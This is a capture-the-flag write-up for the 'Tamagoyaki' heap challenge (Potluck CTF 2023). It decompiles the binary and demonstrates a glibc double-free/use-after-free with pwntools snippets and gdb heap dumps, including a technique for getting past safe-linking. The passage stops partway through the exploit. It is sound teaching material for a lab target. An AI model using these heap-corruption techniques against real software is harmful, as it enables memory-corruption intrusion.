Tamagoyaki
=

Written for Potluck CTF 2023, 37C3.

By UDP - Blue Water / Water Paddler

Thank you to my team mate @sshckk for play-testing and giving feedback on the chal.

```
$ checksec ./chal
[*] './chal'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

## Reverse engineering 

### tl;dr

The binary allows us to `malloc` up to `0x600` bytes, 127 times.
You can specify an offset to write from, then write whatever you want until the end of the buffer.

This is then stored in the array `alloc_arr`, which you can `free` from at any point. No special care is taken, and entries are never removed. You can thereby call `free` on an entry in the `alloc_arr` as much as you want.

A page is `mmaped` and a `pointer` to this page is stored in the `heap`. This `mmaped` page contains the flag at an offset, as is printed if you can write a magic value to the page.

Read the rest of the reverse engineering section if you want to know the specifics or skip to `exploitation` if you are satisfied with this tl;dr.
#### Main

Upon opening the binary in Ida, the player is presented with the following `main` function:
```c
int __fastcall __noreturn main(int argc, const char **argv, const char **envp)
{
  unsigned int v3; // [rsp+Ch] [rbp-14h] BYREF
  __int64 v4; // [rsp+10h] [rbp-10h]
  unsigned __int64 v5; // [rsp+18h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  v4 = prep(argc, argv, envp);
  v3 = 0;
  while ( 1 )
  {
    menu();
    if ( (int)__isoc99_scanf("%u", &v3) <= 0 )
      break;
    if ( v3 == 3 )
    {
      dinner(v4);
    }
    else if ( v3 <= 3 )
    {
      if ( v3 == 1 )
      {
        do_malloc();
      }
      else if ( v3 == 2 )
      {
        do_free();
      }
    }
  }
  exit(1);
}
```

Here, we are presented with 4 different functions: `prep`, `menu`, `dinner`, `do_malloc` and `do_free`.

`prep` is called in the beginning of the binary no matter what.
`menu` is called in a `while(1) {` loop with a switch statement.

A call to `scanf` is present, which scans for an unsigned integer, populating `v3` which is then used in a switch statement to call either `dinner`, `do_malloc` or `do_free`.

#### Prep

Looking at the `prep` function we see the following:
```c
_QWORD *prep()
{
  int fd; // [rsp+Ch] [rbp-24h]
  void *addr; // [rsp+10h] [rbp-20h] BYREF
  _QWORD *v3; // [rsp+18h] [rbp-18h]
  _QWORD *v4; // [rsp+20h] [rbp-10h]
  unsigned __int64 v5; // [rsp+28h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  addr = 0LL;
  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(stdout, 0LL, 2, 0LL);
  setvbuf(stderr, 0LL, 2, 0LL);
  getrandom(&addr, 8LL, 2LL);
  addr = (void *)((unsigned __int64)addr & 0xFFFFFFFF000LL);
  v3 = mmap(addr, 0x1000uLL, 3, 34, 0, 0LL);
  *v3 = 0xF00DBEEFCAFE1337LL;
  fd = open("flag.txt", 0);
  if ( read(fd, v3 + 32, 0xC8uLL) == -1 )
  {
    speak("Error reading flag. Plz contact chal author\n");
    exit(1);
  }
  close(fd);
  v4 = malloc(0x18uLL);
  *v4 = v3;
  prctl(22, 1LL);
  return v3;
}
```

This function is called in the very beginning of main. It first disables libc buffering for `stdin`, `stdout` and `stderr`. 

After this it then uses a call to `getrandom` to get 8 random bytes in to the `addr` variable, which it immediately after applies an `and` mask to, removing the lower 12 bits.

This address is then used to `mmap` a page for the address, stored in `v3`.
`v3` then proceeds to get a dummy value written to it, namely `0xF00DBEEFCAFE1337`.

The file `flag.txt` is then opened and written to the newly created page at `v3 + 32`.

Next, the address of `v3` is written to a `0x18` heap chunk.

Finally the binary is "sandboxed" with the seccomp "strict" mode: `prctl(PR_SET_SECCOMP, SECCOMP_MODE_STRICT)` and the `mmaped` page is returned.

#### Menu

Looking at the `menu` function, we see the following:
```c
__int64 menu()
{
  speak("1. make allocation\n");
  speak("2. do free\n");
  speak("3. go eat dinner!\n");
  return speak("> ");
}
```

This seemingly just calls `speak` with a string, printing out the different available options in the binary.

#### Speak

Looking at the `speak` function, we see the following:
```c
ssize_t __fastcall speak(const char *a1)
{
  int v2; // [rsp+1Ch] [rbp-4h]

  v2 = strlen(a1);
  return write(1, a1, v2);
}
```

This takes in a string in `a1`, calls `strlen` on it, then uses the `write` `syscall` to write the length of the buffer to `stdout`. Seemingly just a primitive `puts()`.

#### do_malloc

Looking at the `do_malloc` call, we see the following:
```c
unsigned __int64 do_malloc()
{
  unsigned int v0; // eax
  size_t size; // [rsp+0h] [rbp-20h] BYREF
  size_t v3; // [rsp+8h] [rbp-18h] BYREF
  char *v4; // [rsp+10h] [rbp-10h]
  unsigned __int64 v5; // [rsp+18h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  size = 0LL;
  v3 = 0LL;
  if ( (unsigned int)alloc_count > 0x7F )
  {
    speak("Reached max allocations.\n");
    exit(1);
  }
  speak("Allocation size: ");
  if ( (int)__isoc99_scanf("%lu", &size) <= 0 )
    exit(1);
  if ( size > 0x600 )
  {
    speak("We do not have the capacity for that many guests...\n");
    exit(1);
  }
  v4 = (char *)malloc(size);
  if ( !v4 )
  {
    speak("Failed to malloc. Assuming fatal error.\n");
    exit(1);
  }
  v0 = alloc_count++;
  alloc_arr[v0] = v4;
  speak("Write offset: ");
  if ( (int)__isoc99_scanf("%lu", &v3) <= 0 )
    exit(1);
  if ( v3 >= size )
  {
    speak("Why would you do something as silly as that?\n");
    exit(1);
  }
  speak("Data for buffer: ");
  read(0, &v4[v3], size - v3);
  return v5 - __readfsqword(0x28u);
}
```

First, the global variable `alloc_count` is checked to see if the total is larger than `0x7F`.

Then, the player is prompted to enter a size in the form of an `unsigned long` saved to `&size`.  The `size` is subsequently checked to see if it surpasses `0x600` in size.

It then attempts to call `malloc` with the given `size`, storing the pointer in `v4`. If no pointer is returned, the program exits.

Upon a success `alloc_counter` is incremented by one.
Then, a second global variable `alloc_arr` is used with the value of the global variable `alloc_arr` prior to the increment. `alloc_arr` stores the newly allocated `v4` heap chunk.

The player is then prompted for a `write offset` in the form of an `unsigned long`, stored in `v3`. If `v3` is larger than the `size` variable, the program exits.

Finally, the player is prompted for what data to put in the buffer. Here, the `v3` variable (`write offset`) is used to offset `v4` (the `malloc chunk`). The `read count` is set to `size - write offset`. 

#### do_free

Looking at the `do_free` function, we see the following:
```c
unsigned __int64 do_free()
{
  unsigned int v1; // [rsp+4h] [rbp-Ch] BYREF
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  v1 = 0;
  speak("Free idx: ");
  if ( (int)__isoc99_scanf("%u", &v1) <= 0 )
    exit(1);
  if ( v1 >= alloc_count )
  {
    speak("You cannot free something that is yet to be....\n");
    exit(1);
  }
  free((void *)alloc_arr[v1]);
  return v2 - __readfsqword(0x28u);
}
```

The player is prompted for an index to `free`, stored in `v1`.
It then checks if the global variable `alloc_count` is smaller than or equals to `v1` (requested index to free).  

If `v1` is smaller than `alloc_count`, the index is looked up in `alloc_arr` and subsequently called `free` on.

There is no check as to whether or not this has already been `free'd`, allowing for the likes of `double free` and creating fake chunks.

#### dinner

Looking at the `dinner` function, we see the following:
```c
unsigned __int64 __fastcall dinner(__int64 a1)
{
  unsigned __int64 v2; // [rsp+E8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  speak("Checking for win condition...\n");
  if ( *(_QWORD *)a1 == 0x37c3c7f )
  {
    speak((const char *)(a1 + 256));
    exit(0);
  }
  speak("Try harder\n");
  return v2 - __readfsqword(0x28u);
}
```

`a1` is checked to see if it is equals to `0x37c3c7f` (37C3 CTF).
If it is, `a1+256` is written to `stdout`.

`a1` is passed from `prep`, which is the `mmaped` page containing the `win` page.

A classic `win` function.

## Exploitation

See reverse engineering section to understand the binary.

### Goal

So the goal is to somehow make an allocation with the `win` pointer, which is graciously given to us during the `prep` function in a `0x18` chunk.

There is no apparent way to get any leaks, not even by writing to `__IO_2_1_stdout` or `__IO_file_underflow` or similar, as all writing is done via syscalls.

Gaining code exec by writing to libc (see nobodyisnobody's [great page for examples](https://github.com/nobodyisnobody/docs/tree/main/code.execution.on.last.libc)) is also difficult, as the binary is locked down by `seccomp strict`, limiting the syscalls to: `read`, `write`, `_exit` and `sigreturn`. 

### vulnerability

As mentioned a couple of times now, `alloc_arr` is a dynamic array which only gets appended to and never deleted from. There is no checks as to whether or not an entry has already been called `free` on, allowing us to call free on any `pointer` that is returned by `malloc` as much as we want.

An example of this:
```
$ ./chal 
1. make allocation
2. do free
3. go eat dinner!
> 1
Allocation size: 24
Write offset: 0
Data for buffer: .
1. make allocation
2. do free
3. go eat dinner!
> 2
Free idx: 0
1. make allocation
2. do free
3. go eat dinner!
> 2
Free idx: 0
Killed
```

**note** that we see *Killed* here instead of the expected: `free(): double free detected in tcache 2`. This is due to the error messages being printed via the `writev` syscall, which is not allowed in the `seccomp strict` filter. 

However when patching out the `prctl(PR_SET_SECCOMP, SECCOMP_MODE_STRICT)` call, we can see the full message:
```
[...]
> 2
Free idx: 0
free(): double free detected in tcache 2
Aborted (core dumped)
```

#### Exploit script base

To make exploitation simpler, the following helper functions will be used to interact with the binary:
```python
#!/usr/bin/env python3
from pwn import *

elf = ELF('./chal')

alloc_count = -1

def menu():
    return p.recvuntil(b'> ')

def malloc(size, data, offset=0):
    global alloc_count
    print("[%s]malloc(%s)" % (alloc_count+1, hex(size)))
    p.sendline(b'1')
    p.sendlineafter(b'Allocation size: ', str(size).encode())
    p.sendlineafter(b'Write offset: ', str(offset).encode())
    p.sendafter(b'Data for buffer: ', data)
    alloc_count += 1
    menu()
    return alloc_count

def free(idx):
    print("free(%s)" % idx)
    p.sendline(b'2')
    p.sendlineafter(b'Free idx: ', str(idx).encode())
    menu()

p = process(elf.path)
menu()

[...]

p.interactive()
```

There functions will be used to reference interacting with the binary from now on in the binary.
#### Double free in 2023(4)? (achieving UAF)

Once upon a time, double-free's used to be as simple as: `free(a)`, `free(b)`, `free(a)`.
This however no longer works in 2023(4):
```python
[...]
a = malloc(0x18, b'a')
b = malloc(0x18, b'b')
c = malloc(0x18, b'c')
free(a)
free(b)
free(a)
[...]
```
```
$ ./solve.py
free(): double free detected in tcache 2
Aborted (core dumped)
```

Instead, we will use a technique inspired by [house of botcake](https://github.com/shellphish/how2heap/blob/master/glibc_2.35/house_of_botcake.c) to gain a UAF. Take the following example:
```python
# Create 7 filler chunks to exhaust t-cache later
tcache_0x90 = []
for i in range(7):
    tcache_0x110.append(malloc(0x88, b'Filler for t-cache'))

# Make two chunks for later
a = malloc(0x88, b'A'*0x18)
b = malloc(0x88, b'B'*0x18)

# Prevent chunk consolidation
malloc(0x18, b'Guard chunk')

# Exhaust t-cache for 0x88 entries
for i in tcache_0x90:
    free(i)

# Free a and b to make them consolidate in to one large unsorted chunk
free(a)
free(b)
```

Inspecting the heap entries and `alloc_arr` in `gdb` shows the following:
```
pwndbg> bins

tcachebins
0x90 [  7]: 0x562250b70620 —▸ 0x562250b70590 —▸ 0x562250b70500 —▸ 0x562250b70470 —▸ 0x562250b703e0 —▸ 0x562250b70350 —▸ 0x562250b702c0 ◂— 0x0
fastbins
empty
unsortedbin
all: 0x562250b706a0 —▸ 0x7f4c689fed00 ◂— 0x562250b706a0
smallbins
empty
largebins
empty
pwndbg> vis 90

0x562250b70000	0x0000000000000000	0x0000000000000291	................
[...]
0x562250b706a0	0x0000000000000000	0x0000000000000121	........!....... <-- unsortedbin[all][0]
0x562250b706b0	0x00007f4c689fed00	0x00007f4c689fed00	...hL......hL...
0x562250b706c0	0x4141414141414141	0x0000000000000000	AAAAAAAA........
0x562250b706d0	0x0000000000000000	0x0000000000000000	................
0x562250b706e0	0x0000000000000000	0x0000000000000000	................
0x562250b706f0	0x0000000000000000	0x0000000000000000	................
0x562250b70700	0x0000000000000000	0x0000000000000000	................
0x562250b70710	0x0000000000000000	0x0000000000000000	................
0x562250b70720	0x0000000000000000	0x0000000000000000	................
0x562250b70730	0x0000000000000090	0x0000000000000090	................
0x562250b70740	0x4242424242424242	0x4242424242424242	BBBBBBBBBBBBBBBB
0x562250b70750	0x4242424242424242	0x0000000000000000	BBBBBBBB........
0x562250b70760	0x0000000000000000	0x0000000000000000	................
0x562250b70770	0x0000000000000000	0x0000000000000000	................
0x562250b70780	0x0000000000000000	0x0000000000000000	................
0x562250b70790	0x0000000000000000	0x0000000000000000	................
0x562250b707a0	0x0000000000000000	0x0000000000000000	................
0x562250b707b0	0x0000000000000000	0x0000000000000000	................
0x562250b707c0	0x0000000000000120	0x0000000000000020	 ....... .......
0x562250b707d0	0x6863206472617547	0x00000000006b6e75	Guard chunk.....
0x562250b707e0	0x0000000000000000	0x0000000000020821	........!....... <-- Top chunk
pwndbg> telescope &alloc_arr 20
00:0000│  0x5622505ac060 (alloc_arr) —▸ 0x562250b702c0 ◂— 0x562250b70
01:0008│  0x5622505ac068 (alloc_arr+8) —▸ 0x562250b70350 ◂— 0x5627329209b0
02:0010│  0x5622505ac070 (alloc_arr+16) —▸ 0x562250b703e0 ◂— 0x562732920820
03:0018│  0x5622505ac078 (alloc_arr+24) —▸ 0x562250b70470 ◂— 0x562732920890
04:0020│  0x5622505ac080 (alloc_arr+32) —▸ 0x562250b70500 ◂— 0x562732920f00
05:0028│  0x5622505ac088 (alloc_arr+40) —▸ 0x562250b70590 ◂— 0x562732920e70
06:0030│  0x5622505ac090 (alloc_arr+48) —▸ 0x562250b70620 ◂— 0x562732920ee0
07:0038│  0x5622505ac098 (alloc_arr+56) —▸ 0x562250b706b0 —▸ 0x7f4c689fed00 —▸ 0x562250b707e0 ◂— 0x0
08:0040│  0x5622505ac0a0 (alloc_arr+64) —▸ 0x562250b70740 ◂— 'BBBBBBBBBBBBBBBBBBBBBBBB'
09:0048│  0x5622505ac0a8 (alloc_arr+72) —▸ 0x562250b707d0 ◂— 'Guard chunk'
0a:0050│  0x5622505ac0b0 (alloc_arr+80) ◂— 0x0
... ↓     9 skipped

```

Here, we can see that entry number 8 (`alloc_arr+64)` points to `—▸ 0x562250b70740 ◂— 'BBBBBBBBBBBBBBBBBBBBBBBB'`.
Now instead of writing `B` in this chunk we could fake a chunk and call `free` on it, which would grant us a `Use After Free (UAF)`!

Example:
```python
# Same as above
[...]

# Craft a fake chunk from the newly merged unsorted chunk
unsorted_chunk = malloc(0x118, p8(0x21), offset=0x88)

# Free the fake chunk
free(b)

# Free the unsorted chunk again
free(unsorted_chunk)
```


This will then give a `UAF` primitive which can be used to further exploit the program:
```
0x56380aee46a0	0x0000000000000000	0x0000000000000121	........!.......
0x56380aee46b0	0x000000056380aee4	0x3ebdbb8d71da1a86	...c.......q...>	 <-- tcachebins[0x120][0/1]
0x56380aee46c0	0x4141414141414141	0x0000000000000000	AAAAAAAA........
0x56380aee46d0	0x0000000000000000	0x0000000000000000	................
0x56380aee46e0	0x0000000000000000	0x0000000000000000	................
0x56380aee46f0	0x0000000000000000	0x0000000000000000	................
0x56380aee4700	0x0000000000000000	0x0000000000000000	................
0x56380aee4710	0x0000000000000000	0x0000000000000000	................
0x56380aee4720	0x0000000000000000	0x0000000000000000	................
0x56380aee4730	0x0000000000000090	0x0000000000000021	........!.......
0x56380aee4740	0x000000056380aee4	0x3ebdbb8d71da1a86	...c.......q...>	 <-- tcachebins[0x20][0/1]
0x56380aee4750	0x4242424242424242	0x0000000000000000	BBBBBBBB........
0x56380aee4760	0x0000000000000000	0x0000000000000000	................
0x56380aee4770	0x0000000000000000	0x0000000000000000	................
0x56380aee4780	0x0000000000000000	0x0000000000000000	................
0x56380aee4790	0x0000000000000000	0x0000000000000000	................
0x56380aee47a0	0x0000000000000000	0x0000000000000000	................
0x56380aee47b0	0x0000000000000000	0x0000000000000000	................
0x56380aee47c0	0x0000000000000120	0x0000000000000021	 .......!.......
0x56380aee47d0	0x6863206472617547	0x00000000006b6e75	Guard chunk.....
0x56380aee47e0	0x0000000000000000	0x0000000000020821	........!.......	 <-- Top chunk
```

notice how the `t-cache entry` for `0x120` consumes the `t-cache entry` for `0x20`. This is the basis of the `UAF`.


### Crafting primitives

At this point, the vulnerability is clear. Question is, how do we go about exploiting it?
Well to bypass [`protect_ptr`](https://research.checkpoint.com/2020/safe-linking-eliminating-a-20-year-old-malloc-exploit-primitive/) without a leak, we first need to gain `arbitrary heap write`.

Gaining `arb heap write` is without a doubt one of (if not the) hardest parts of the challenge.

#### Gaining arb heap write

##### Back story
[`protect_ptr`](https://research.checkpoint.com/2020/safe-linking-eliminating-a-20-year-old-malloc-exploit-primitive/) made it more difficult to hijack a `heap pointer` by overwriting the  `least significant bytes (LSB)`, so we need to get creative.

A juicy target however is the [`per-thread cache`](https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=d5c3fafc4307c9b7a4c7d5cb381fcdbfad340bcc), which is located at `heap+0x8`. This contains the `raw t-cache pointers`, *after* they have been "unprotected". 

If we can write to the `per-thread cache`, we can simply overwrite the `LSB` of the pointers we can reach. This gives us `arb write` in the heap, and in theory also `libc` if done right (but we don't need that).

Ok, so how?

`protect_ptr` only targets t-cache for now. This means that bins such as `fast bins`, `small bins`, `large bins` and `unsorted bins` still have "full" `heap pointers`. 

Our target is the `per-thread cache`, which means we can write very little to it. In fact, all we can really control is the amount of entries in each `t-cache` and their `pointers` which are given by `free`.

This however is enough to fake an entry for `unsorted bins`.

When an entry is added to the `t-cache`, the `entry count` is incremented by one ([with a max of 7 by default](https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=2527e2504761744df2bdb1abdc02d936ff907ad2;hb=d5c3fafc4307c9b7a4c7d5cb381fcdbfad340bcc#l315)) and a pointer is added.

For example, the `per-thread cache` for the following would look like this:
```python
[...]
free(malloc(0x18, b'.'))
free(malloc(0x28, b'.'))
free(malloc(0x38, b'.'))

free(malloc(0x68, b'.'))
free(malloc(0x78, b'.'))
free(malloc(0x88, b'.'))
```
```
pwndbg> vis 1

0x5586b5c70000	0x0000000000000000	0x0000000000000291	................
0x5586b5c70010	0x0000000100010001	0x0001000100010000	................
0x5586b5c70020	0x0000000000000000	0x0000000000000000	................
0x5586b5c70030	0x0000000000000000	0x0000000000000000	................
0x5586b5c70040	0x0000000000000000	0x0000000000000000	................
0x5586b5c70050	0x0000000000000000	0x0000000000000000	................
0x5586b5c70060	0x0000000000000000	0x0000000000000000	................
0x5586b5c70070	0x0000000000000000	0x0000000000000000	................
0x5586b5c70080	0x0000000000000000	0x0000000000000000	................
0x5586b5c70090	0x00005586b5c702c0	0x00005586b5c702e0	.....U.......U..
0x5586b5c700a0	0x00005586b5c70310	0x0000000000000000	.....U..........
0x5586b5c700b0	0x0000000000000000	0x00005586b5c70350	........P....U..
0x5586b5c700c0	0x00005586b5c703c0	0x00005586b5c70440	.....U..@....U..
0x5586b5c700d0	0x0000000000000000	0x0000000000000000	................
[...]
pwndbg> bins
tcachebins
0x20 [  1]: 0x5586b5c702c0 ◂— 0x0
0x30 [  1]: 0x5586b5c702e0 ◂— 0x0
0x40 [  1]: 0x5586b5c70310 ◂— 0x0
0x70 [  1]: 0x5586b5c70350 ◂— 0x0
0x80 [  1]: 0x5586b5c703c0 ◂— 0x0
0x90 [  1]: 0x5586b5c70440 ◂— 0x0
```

We can see that each t-cache entry has a `1` set in the `per-thread cache`, followed further down by a `pointer` to said entry.

##### The plan

The largest `t-cache entry` is `0x408`, which will be placed right above `0x18` and `0x28`'s pointers.

This sparks an idea.

What if we used our `UAF` to fake a chunk in the `per-thread cache` right under the entries count section, using `0x18` and `0x28` as `foward pointer (FWD)` and `backward pointer (BCK)`?

The idea is simple. `Allocate` and `free` two chunks of size `0x3d8` and `0x3e8`.
This will write the bits `0x0000000000010001`, which could be interpreted from `libc's` point of view as a chunk of size `0x10000`. Now if we also `allocate` and `free` two other chunks in `0x18` and `0x28`, we get a heap setup that looks like the following:
```python
[...]
free(malloc(0x18, b'.'))
free(malloc(0x28, b'.'))

free(malloc(0x3d8, b'.'))
free(malloc(0x3e8, b'.'))
```
```
pwndbg> vis 90

0x56355a945000	0x0000000000000000	0x0000000000000291	................
0x56355a945010	0x0000000000010001	0x0000000000000000	................
0x56355a945020	0x0000000000000000	0x0000000000000000	................
0x56355a945030	0x0000000000000000	0x0000000000000000	................
0x56355a945040	0x0000000000000000	0x0000000000000000	................
0x56355a945050	0x0000000000000000	0x0000000000000000	................
0x56355a945060	0x0000000000000000	0x0000000000000000	................
0x56355a945070	0x0000000000000000	0x0000000000000000	................

# This looks like a malloc chunk -------|
										v
0x56355a945080	0x0000000000000000	0x0000000000010001	................
0x56355a945090	0x000056355a9452c0	0x000056355a9452e0	.R.Z5V...R.Z5V..
0x56355a9450a0	0x0000000000000000	0x0000000000000000	................

```

The important part here is that a chunk can now be faked from `libc's` perspective, provided a bit more work is put in:
```
pwndbg> try_free 0x56355a945090
General checks
Not mapped checks
double free or corruption (!prev) -> next chunk's previous-in-use bit is 0

free(): invalid next size (normal) -> next chunk's size not in [2*size_sz; system_mem]
next chunk's size is 0x0, 2*size_sz is 0x10, system_mem is 0x21000
Next chunk is not top chunk
Forward consolidation
Doing malloc_consolidate and systrim/heap_trim
----------
Errors found!

pwndbg> set {long}(0x56355a945080+0x10000)=0x10000
pwndbg> set {long}(0x56355a945080+0x10008)=0x21

pwndbg> try_free 0x56355a945090
General checks
Not mapped checks
Next chunk is not top chunk
Forward consolidation
Doing malloc_consolidate and systrim/heap_trim
----------
All checks passed!
```
*(Note: we do not need to call `free` on this chunk. It is purely to illustrate that `libc` would consider it a valid chunk if the proper bytes are set)*

We will use this to hijack an `unsorted bin` entry in combination with a `UAF` to fake a chunk in the `per-thread cache`. If you do not know what an `unsorted bin` entry looks like, perhaps you should read [https://sourceware.org/glibc/wiki/MallocInternals](https://sourceware.org/glibc/wiki/MallocInternals).

##### Execution

Now comes the part of actually doing. The plan is as mentioned to craft a valid `free chunk` which can be indexed in an `unsorted bin` array. This means the `BCK` and `FWD` pointers have to be valid. We can use the `UAF` to make a `0x18` and `0x28` chunk to fulfill this requirement. Combined with the `0x3d8` and `0x3e8` count entries, a valid fake `unsorted bin` entry can be crafted.

First thing first, we need to allocate some chunks needed for later and fill up the `0x90 t-cache`:
```python
#####################################
#           Prep allocations        #
#####################################

# This is the chunk size we will be working with for the unsorted bin hijack
mal_size = 0x88

# Make allocations for exhausting t-cache for later
tcache_0x90 = []
tcache_0x1b0 = []
for i in range(7):
    tcache_0x90.append(malloc(mal_size, b'TCACHE_FUEL'))
for i in range(7):
    tcache_0x1b0.append(malloc(0x1a8, b'TCACHE_FUEL'))

# Set 0x10001 in heap above 0x20 and 0x30 t-cache list
free(malloc(0x3d8, b'LSB OF FAKE CHUNK SIZE'))
free(malloc(0x3e8, b'MSB OF FAKE CHUNK SIZE'))

# Prep the allocation for two large unosrted bin entries with the ability
# to create a UAF
malloc(0x18, b'GUARD 1')
a1 = malloc(mal_size, b'A1'*(mal_size//2))
b1 = malloc(mal_size, b'B1'*(mal_size//2))
c1 = malloc(mal_size, b'C1'*(mal_size//2))
d1 = malloc(mal_size, b'D1'*(mal_size//2))
malloc(0x18, b'GUARD 2')
a2 = malloc(mal_size, b'A2'*(mal_size//2))
b2 = malloc(mal_size, b'B2'*(mal_size//2))
c2 = malloc(mal_size, b'C2'*(mal_size//2))
d2 = malloc(mal_size, b'D2'*(mal_size//2))
malloc(0x18, b'GUARD 3')

# Fill up the 0x90 t-cache
for i in tcache_0x90:
    free(i)

```

Next, let's create two `unsorted chunk` entries by `freeing` the chunks we just made:
```python
#########################################################
#           Create the UAF setup for later              #
#########################################################
free(a1)
free(b1)
free(c1)

free(a2)
free(b2)
free(c2)
```

This will look like the following in memory (disregarding the `t-cache fillings`):
```
0x55ee5ca96a40	0x0000000000000000	0x0000000000000021	........!.......
0x55ee5ca96a50	0x0031204452415547	0x0000000000000000	GUARD 1.........
0x55ee5ca96a60	0x0000000000000000	0x00000000000001b1	................ <-- unsortedbin[all][1]
0x55ee5ca96a70	0x00007f0638ffed00	0x000055ee5ca96cc0	...8.....l.\.U..
0x55ee5ca96a80	0x3141314131413141	0x3141314131413141	A1A1A1A1A1A1A1A1
0x55ee5ca96a90	0x3141314131413141	0x3141314131413141	A1A1A1A1A1A1A1A1
0x55ee5ca96aa0	0x3141314131413141	0x3141314131413141	A1A1A1A1A1A1A1A1
0x55ee5ca96ab0	0x3141314131413141	0x3141314131413141	A1A1A1A1A1A1A1A1
0x55ee5ca96ac0	0x3141314131413141	0x3141314131413141	A1A1A1A1A1A1A1A1
0x55ee5ca96ad0	0x3141314131413141	0x3141314131413141	A1A1A1A1A1A1A1A1
0x55ee5ca96ae0	0x3141314131413141	0x3141314131413141	A1A1A1A1A1A1A1A1
0x55ee5ca96af0	0x0000000000000090	0x0000000000000090	................
0x55ee5ca96b00	0x3142314231423142	0x3142314231423142	B1B1B1B1B1B1B1B1
0x55ee5ca96b10	0x3142314231423142	0x3142314231423142	B1B1B1B1B1B1B1B1
0x55ee5ca96b20	0x3142314231423142	0x3142314231423142	B1B1B1B1B1B1B1B1
0x55ee5ca96b30	0x3142314231423142	0x3142314231423142	B1B1B1B1B1B1B1B1
0x55ee5ca96b40	0x3142314231423142	0x3142314231423142	B1B1B1B1B1B1B1B1
0x55ee5ca96b50	0x3142314231423142	0x3142314231423142	B1B1B1B1B1B1B1B1
0x55ee5ca96b60	0x3142314231423142	0x3142314231423142	B1B1B1B1B1B1B1B1
0x55ee5ca96b70	0x3142314231423142	0x3142314231423142	B1B1B1B1B1B1B1B1
0x55ee5ca96b80	0x0000000000000120	0x0000000000000090	 ...............
0x55ee5ca96b90	0x3143314331433143	0x3143314331433143	C1C1C1C1C1C1C1C1
0x55ee5ca96ba0	0x3143314331433143	0x3143314331433143	C1C1C1C1C1C1C1C1
0x55ee5ca96bb0	0x3143314331433143	0x3143314331433143	C1C1C1C1C1C1C1C1
0x55ee5ca96bc0	0x3143314331433143	0x3143314331433143	C1C1C1C1C1C1C1C1
0x55ee5ca96bd0	0x3143314331433143	0x3143314331433143	C1C1C1C1C1C1C1C1
0x55ee5ca96be0	0x3143314331433143	0x3143314331433143	C1C1C1C1C1C1C1C1
0x55ee5ca96bf0	0x3143314331433143	0x3143314331433143	C1C1C1C1C1C1C1C1
0x55ee5ca96c00	0x3143314331433143	0x3143314331433143	C1C1C1C1C1C1C1C1
0x55ee5ca96c10	0x00000000000001b0	0x0000000000000090	................
0x55ee5ca96c20	0x3144314431443144	0x3144314431443144	D1D1D1D1D1D1D1D1
0x55ee5ca96c30	0x3144314431443144	0x3144314431443144	D1D1D1D1D1D1D1D1
0x55ee5ca96c40	0x3144314431443144	0x3144314431443144	D1D1D1D1D1D1D1D1
0x55ee5ca96c50	0x3144314431443144	0x3144314431443144	D1D1D1D1D1D1D1D1
0x55ee5ca96c60	0x3144314431443144	0x3144314431443144	D1D1D1D1D1D1D1D1
0x55ee5ca96c70	0x3144314431443144	0x3144314431443144	D1D1D1D1D1D1D1D1
0x55ee5ca96c80	0x3144314431443144	0x3144314431443144	D1D1D1D1D1D1D1D1
0x55ee5ca96c90	0x3144314431443144	0x3144314431443144	D1D1D1D1D1D1D1D1
0x55ee5ca96ca0	0x3144314431443144	0x0000000000000021	D1D1D1D1!.......
0x55ee5ca96cb0	0x0032204452415547	0x0000000000000000	GUARD 2.........
0x55ee5ca96cc0	0x0000000000000000	0x00000000000001b1	................ <-- unsortedbin[all][0]
0x55ee5ca96cd0	0x000055ee5ca96a60	0x00007f0638ffed00	`j.\.U.....8....
0x55ee5ca96ce0	0x3241324132413241	0x3241324132413241	A2A2A2A2A2A2A2A2
0x55ee5ca96cf0	0x3241324132413241	0x3241324132413241	A2A2A2A2A2A2A2A2
0x55ee5ca96d00	0x3241324132413241	0x3241324132413241	A2A2A2A2A2A2A2A2
0x55ee5ca96d10	0x3241324132413241	0x3241324132413241	A2A2A2A2A2A2A2A2
0x55ee5ca96d20	0x3241324132413241	0x3241324132413241	A2A2A2A2A2A2A2A2
0x55ee5ca96d30	0x3241324132413241	0x3241324132413241	A2A2A2A2A2A2A2A2
0x55ee5ca96d40	0x3241324132413241	0x3241324132413241	A2A2A2A2A2A2A2A2
0x55ee5ca96d50	0x0000000000000090	0x0000000000000090	................
0x55ee5ca96d60	0x3242324232423242	0x3242324232423242	B2B2B2B2B2B2B2B2
0x55ee5ca96d70	0x3242324232423242	0x3242324232423242	B2B2B2B2B2B2B2B2
0x55ee5ca96d80	0x3242324232423242	0x3242324232423242	B2B2B2B2B2B2B2B2
0x55ee5ca96d90	0x3242324232423242	0x3242324232423242	B2B2B2B2B2B2B2B2
0x55ee5ca96da0	0x3242324232423242	0x3242324232423242	B2B2B2B2B2B2B2B2
0x55ee5ca96db0	0x3242324232423242	0x3242324232423242	B2B2B2B2B2B2B2B2
0x55ee5ca96dc0	0x3242324232423242	0x3242324232423242	B2B2B2B2B2B2B2B2
0x55ee5ca96dd0	0x3242324232423242	0x3242324232423242	B2B2B2B2B2B2B2B2
0x55ee5ca96de0	0x0000000000000120	0x0000000000000090	 ...............
0x55ee5ca96df0	0x3243324332433243	0x3243324332433243	C2C2C2C2C2C2C2C2
0x55ee5ca96e00	0x3243324332433243	0x3243324332433243	C2C2C2C2C2C2C2C2
0x55ee5ca96e10	0x3243324332433243	0x3243324332433243	C2C2C2C2C2C2C2C2
0x55ee5ca96e20	0x3243324332433243	0x3243324332433243	C2C2C2C2C2C2C2C2
0x55ee5ca96e30	0x3243324332433243	0x3243324332433243	C2C2C2C2C2C2C2C2
0x55ee5ca96e40	0x3243324332433243	0x3243324332433243	C2C2C2C2C2C2C2C2
0x55ee5ca96e50	0x3243324332433243	0x3243324332433243	C2C2C2C2C2C2C2C2
0x55ee5ca96e60	0x3243324332433243	0x3243324332433243	C2C2C2C2C2C2C2C2
0x55ee5ca96e70	0x00000000000001b0	0x0000000000000090	................
0x55ee5ca96e80	0x3244324432443244	0x3244324432443244	D2D2D2D2D2D2D2D2
